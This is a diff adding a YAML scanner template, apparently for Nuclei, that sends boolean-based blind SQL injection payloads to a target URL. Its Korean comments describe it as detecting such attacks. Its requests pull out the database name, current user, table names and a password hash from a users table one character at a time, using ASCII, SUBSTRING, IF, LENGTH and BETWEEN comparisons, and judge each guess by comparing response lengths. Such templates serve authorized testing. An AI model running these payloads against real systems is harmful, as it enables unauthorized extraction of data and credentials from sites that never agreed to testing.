@@ -1,0 +1,36 @@
+id: sqli-blind-boolean-binary-search
+
+info:
+  name: Blind SQL Injection Boolean Binary Search (Data Extraction)
+  author: security-researcher
+  severity: high
+  description: |
+    이진 탐색(Binary Search)을 이용한 블라인드 SQL 인젝션 데이터 추출 패턴을 탐지합니다.
+    ASCII 값 비교를 통해 한 글자씩 데이터를 추출하는 방식입니다.
+  tags: sqli,blind,boolean,binary-search,injection,data-extraction
+
+http:
+  - method: GET
+    path:
+      # DB 이름 첫 번째 문자 추출 (a~z 이진 탐색)
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING(database(),1,1))>64--"
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING(database(),1,1))>96--"
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING(database(),1,1))=109--"
+      # 사용자 이름 추출
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING(user(),1,1))>64--"
+      # 테이블명 추출
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))>64--"
+      # 패스워드 해시 추출
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
+      # IF 기반
+      - "{{BaseURL}}?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>96,1,0)--"
+      - "{{BaseURL}}?id=1 AND IF(LENGTH(database())>4,1,0)--"
+      # BETWEEN 기반
+      - "{{BaseURL}}?id=1 AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 122--"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body_1) != len(body_2)"
+          - "status_code_1 == 200 && status_code_2 == 200"
+        condition: and
